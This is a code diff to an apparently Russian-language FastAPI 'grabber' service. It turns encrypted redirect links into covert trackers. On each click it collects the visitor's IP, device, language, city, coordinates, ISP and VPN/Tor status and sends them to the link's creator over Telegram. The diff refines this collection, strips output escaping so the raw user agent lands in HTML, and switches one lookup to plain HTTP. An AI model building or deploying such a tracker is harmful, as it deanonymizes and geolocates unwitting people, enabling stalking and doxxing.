@@ -6,21 +6,11 @@ import json
 from datetime import datetime
 from config import SECRET_KEY, BOT_TOKEN
 import user_agents
-import re
 
 app = FastAPI()
 cipher = Fernet(SECRET_KEY)
 
 IPINFO_TOKEN = ""  # Бесплатный план без токена до 50k запросов/мес
-
-
-def escape_markdown(text: str) -> str:
-    """
-    Экранирование спецсимволов для MarkdownV2, чтобы Telegram не ругался.
-    """
-    if not text:
-        return "N/A"
-    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!])', r'\\\1', str(text))
 
 
 @app.get("/link/{encrypted_url}")
@@ -32,98 +22,112 @@ async def redirect_encrypted(request: Request, encrypted_url: str):
         original_url = data["url"]
         user_id = data["user_id"]
     except Exception as e:
-        print("Ошибка расшифровки:", e)
+        print("Ошибка при расшифровке ссылки:", e)
         return {"error": "Invalid link"}
 
-    ip = request.client.host
+    # Определяем IP
+    ip = request.headers.get("x-forwarded-for", request.client.host)
+    if ip and "," in ip:  # может быть несколько через запятую
+        ip = ip.split(",")[0].strip()
+
+    # Заголовки
     headers = request.headers
     user_agent_str = headers.get("user-agent", "Unknown")
-    ua = user_agents.parse(user_agent_str)
     accept_lang = headers.get("accept-language", "N/A")
 
+    # Парсим User-Agent
+    ua = user_agents.parse(user_agent_str)
+
     geo_info = {}
-    vpn_info = {}
+    vpn_info = {
+        "vpn": "N/A",
+        "proxy": "N/A",
+        "tor": "N/A",
+        "asn": "N/A",
+        "org": "N/A",
+        "connection_type": "N/A",
+        "timezone": "N/A"
+    }
 
     async with httpx.AsyncClient() as client:
-        # Гео и сетевые данные через ip-api.com (HTTPS!)
+        # Гео и сетевые данные через ip-api.com
         try:
             geo_resp = await client.get(
-                f"https://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp"
+                f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp",
+                timeout=5.0
             )
-            geo_info = geo_resp.json() if geo_resp.status_code == 200 else {}
+            if geo_resp.status_code == 200:
+                geo_info = geo_resp.json()
         except Exception as e:
-            print("Ошибка получения geo_info:", e)
-            geo_info = {}
+            print("Ошибка geo:", e)
 
         # VPN/Proxy/Tor + ASN через ipinfo.io
         try:
-            url = f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}" if IPINFO_TOKEN else f"https://ipinfo.io/{ip}/json"
-            info_resp = await client.get(url)
+            url = f"https://ipinfo.io/{ip}/json"
+            if IPINFO_TOKEN:
+                url += f"?token={IPINFO_TOKEN}"
+            info_resp = await client.get(url, timeout=5.0)
             if info_resp.status_code == 200:
                 info = info_resp.json()
-                vpn_info = {
-                    "vpn": info.get("privacy", {}).get("vpn", "N/A"),
-                    "proxy": info.get("privacy", {}).get("proxy", "N/A"),
-                    "tor": info.get("privacy", {}).get("tor", "N/A"),
+                vpn_info.update({
                     "asn": info.get("org", "N/A").split(" ")[0] if info.get("org") else "N/A",
                     "org": info.get("org", "N/A"),
                     "connection_type": info.get("type", "N/A"),
-                    "timezone": info.get("timezone", "N/A")
-                }
+                    "timezone": info.get("timezone", "N/A"),
+                })
+                if "privacy" in info:  # поле privacy есть только с токеном
+                    vpn_info.update({
+                        "vpn": info["privacy"].get("vpn", "N/A"),
+                        "proxy": info["privacy"].get("proxy", "N/A"),
+                        "tor": info["privacy"].get("tor", "N/A"),
+                    })
         except Exception as e:
-            print("Ошибка получения vpn_info:", e)
-            vpn_info = {
-                "vpn": "N/A", "proxy": "N/A", "tor": "N/A",
-                "asn": "N/A", "org": "N/A", "connection_type": "N/A", "timezone": "N/A"
-            }
+            print("Ошибка ipinfo:", e)
 
-    # Формируем сообщение
+    # Формируем сообщение (HTML, чтобы избежать крашей на Markdown)
     msg_text = f"""
-🔗 *Кто-то кликнул по твоей ссылке!*
+<b>🔗 Кто-то кликнул по твоей ссылке!</b>
 
-🕒 Время: {escape_markdown(datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'))} UTC
-🌐 IP: {escape_markdown(ip)}
-🖥 User-Agent: {escape_markdown(user_agent_str)}
-🌏 Язык системы: {escape_markdown(accept_lang)}
+🕒 Время: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+🌐 IP: {ip}
+🖥 User-Agent: <code>{user_agent_str}</code>
+🌏 Язык системы: {accept_lang}
 
-💻 Платформа: {escape_markdown(ua.os.family)} {escape_markdown(ua.os.version_string)}
-🌍 Браузер: {escape_markdown(ua.browser.family)} {escape_markdown(ua.browser.version_string)}
-📱 Тип устройства: {escape_markdown(ua.device.family)}
+💻 Платформа: {ua.os.family} {ua.os.version_string}
+🌍 Браузер: {ua.browser.family} {ua.browser.version_string}
+📱 Тип устройства: {ua.device.family}
 
 🏙 Гео:
-- Страна: {escape_markdown(geo_info.get('country', 'N/A'))}
-- Регион: {escape_markdown(geo_info.get('regionName', 'N/A'))}
-- Город: {escape_markdown(geo_info.get('city', 'N/A'))}
-- ZIP: {escape_markdown(geo_info.get('zip', 'N/A'))}
-- ISP: {escape_markdown(geo_info.get('isp', 'N/A'))}
-- Координаты: {escape_markdown(geo_info.get('lat', 'N/A'))}, {escape_markdown(geo_info.get('lon', 'N/A'))}
-- [Google Maps](https://www.google.com/maps?q={geo_info.get('lat','')},{geo_info.get('lon','')})
+- Страна: {geo_info.get('country', 'N/A')}
+- Регион: {geo_info.get('regionName', 'N/A')}
+- Город: {geo_info.get('city', 'N/A')}
+- ZIP: {geo_info.get('zip', 'N/A')}
+- ISP: {geo_info.get('isp', 'N/A')}
+- Координаты: {geo_info.get('lat', 'N/A')}, {geo_info.get('lon', 'N/A')}
+- <a href="https://www.google.com/maps?q={geo_info.get('lat', 'N/A')},{geo_info.get('lon', 'N/A')}">Google Maps</a>
 
-🌐 Сетевая информация:
-- ASN: {escape_markdown(vpn_info.get('asn'))}
-- Организация: {escape_markdown(vpn_info.get('org'))}
-- Тип подключения: {escape_markdown(vpn_info.get('connection_type'))}
-- Часовой пояс: {escape_markdown(vpn_info.get('timezone'))}
+🌐 Сеть:
+- ASN: {vpn_info.get('asn')}
+- Организация: {vpn_info.get('org')}
+- Тип подключения: {vpn_info.get('connection_type')}
+- Часовой пояс: {vpn_info.get('timezone')}
 
 🔒 VPN/Proxy/Tor:
-- VPN: {escape_markdown(vpn_info.get('vpn'))}
-- Proxy: {escape_markdown(vpn_info.get('proxy'))}
-- Tor: {escape_markdown(vpn_info.get('tor'))}
+- VPN: {vpn_info.get('vpn')}
+- Proxy: {vpn_info.get('proxy')}
+- Tor: {vpn_info.get('tor')}
 """
-
-    # Логируем сообщение перед отправкой
-    print("==== Сформированное сообщение ====")
-    print(msg_text)
-    print("=================================")
 
     # Отправка в Telegram
     try:
         async with httpx.AsyncClient() as client:
             resp = await client.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                data={"chat_id": user_id, "text": msg_text, "parse_mode": "MarkdownV2"}
+                data={"chat_id": user_id, "text": msg_text, "parse_mode": "HTML"},
+                timeout=5.0
             )
-            print("Ответ от Telegram:", resp.text)
+            if resp.status_code != 200:
+                print("Ошибка ответа от Telegram:", resp.text)
     except Exception as e:
         print("Ошибка отправки в Telegram:", e)
 
